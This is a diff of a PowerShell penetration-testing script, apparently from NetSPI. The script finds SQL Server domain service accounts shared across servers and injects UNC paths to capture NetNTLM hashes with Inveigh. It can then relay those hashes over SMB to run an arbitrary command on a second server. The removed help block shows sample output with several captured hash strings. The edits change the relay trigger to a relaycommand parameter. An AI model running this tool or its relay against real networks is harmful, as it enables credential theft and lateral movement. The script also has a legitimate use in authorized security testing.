@@ -1,51 +1,8 @@
-<#
 # author: scott sutherland (@_nullbind), NetSPI 2016
 # script name: Get-SQLSharedAccountPwHash.ps1
 # requirements: import-module powerupsql.psm1 (https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/PowerUpSQL.psm1);import-module invoke-inveigh.ps1;import-module Inveigh-Relay.ps1 (https://github.com/Kevin-Robertson/Inveigh)
 # Note: use for alt domain user: runas /noprofile /netonly /user:domain\users powershell.exe
 # Example: .\Get-SQLSharedAccountPwHash.ps1 -username domain\user -password SuperPassword! -domaincontroller 10.0.0.1
-
-Example:
-
-.\Get-SQLSharedAccountPwHash.ps1 -username domain.test\user -password SuperPassword! -domaincontroller 10.0.0.1
-Querying domain controller for mssql spn...
-VERBOSE: Grabbing SQL Server SPNs from domain...
-VERBOSE: Getting domain SPNs...
-VERBOSE: 20 SPNs found on servers that matched search criteria.
-VERBOSE: Parsing SQL Server instances from SPNs...
-VERBOSE: 10 instances were found.
-10 MSSQL SPNs found
-Filtering out computer accounts...
-6 MSSQL SPNs found using domain accounts
-Selecting shared accounts...
-3 shared SQL Server domain service accounts were found
-SvcAnt1 : START
-SvcAnt1 : 1 servers were found that use the SQL Server domain service account SvcAnt1
-SvcAnt1 : attempting to connect to each one...
-SvcAnt1 : SQL Servers using the SvcAnt1 service account could not be logged into.
-SvcAnt1 : END
-SvcAnt2 : START
-SvcAnt2 : 4 servers were found that use the SQL Server domain service account SvcAnt2
-SvcAnt2 : attempting to connect to each one...
-SvcAnt2 : 2 sql servers could be logged into that use the sql server service account SvcAnt2
-SvcAnt2 : SQLServer1.domain.test set to target1
-SvcAnt2 : SQLServer2.domain.test set to target2
-SvcAnt2 : Starting sniffer
-SvcAnt2 : Injecting UNC path into SQLServer1.domain.test
-SvcAnt2 : Checking for credentials captured during unc injection from SQLServer1.domain.test
-SvcAnt2::DOMAIN.TEST:39BCDCDE03CDEBCF00000000000000000000000000000000:95FA8EF123EE8BD13C703739CF2072C22959A6BAA6D0B253:1C05072DD72DD8A0
-SvcAnt2::DOMAIN.TEST:832CD84F60ACDFE000000000000000000000000000000000:5547CBDF82480EF1287911952E0F7B3AD84ABEBFC2E63230:DCFA9F06D8A2A80C
-SvcAnt2::DOMAIN.TEST:6A95DBCDEDCDBC6300000000000000000000000000000000:00239A136085815049E2B5B6FBD95BE391A3A92EB447C999:495ECF315E872DD3
-SvcAnt2::DOMAIN.TEST:BF99CDCFF48C3C1400000000000000000000000000000000:47FDDADA2364149614D44F5A44EEF12D0CC363D5AA15F6C5:BA04072DDFB2D91E
-SvcAnt2::DOMAIN.TEST:C9D036CCDEF85ABE00000000000000000000000000000000:8BEAE1E0D83E7F66F318B7F15C83D329AD87041BF303B7FF:097C3695E72DDED5
-SvcAnt2 : Stopping sniffer
-SvcAnt2 : END
-SvcAnt3 : START
-SvcAnt3 : 1 servers were found that use the SQL Server domain service account SvcAnt3
-SvcAnt3 : attempting to connect to each one...
-SvcAnt3 : SQL Servers using the SvcAnt3 service account could not be logged into.
-SvcAnt3 : END
-#>
 
 [CmdletBinding()]
 Param(
@@ -57,9 +14,6 @@ Param(
 
    [Parameter(Mandatory=$false)]
    [string]$domaincontroller,
-
-   [Parameter(Mandatory=$false)]
-   [string]$relayip,
 
    [Parameter(Mandatory=$false)]
    [string]$relaycommand,
@@ -144,9 +98,10 @@ if(-not $x){
             # - import inveigh
             # sniff and set relay target to target2
             Write-Output "$sharedaccount : Starting sniffer"
-            if($relayip){
+            if($relaycommand){
                 
                 # need to check for command here
+                write-output "$sharedaccount : Relay will be performed from $target1 to $target2"
                 Invoke-Inveigh -SMBRelay Y -SMBRelayTarget $target2ip -SMBRelayCommand "$relaycommand" -SpooferHostsReply $target1 -NBNS Y | Out-Null 
             }else{
                 Invoke-Inveigh -SpooferHostsReply $target1 -NBNS Y | Out-Null 
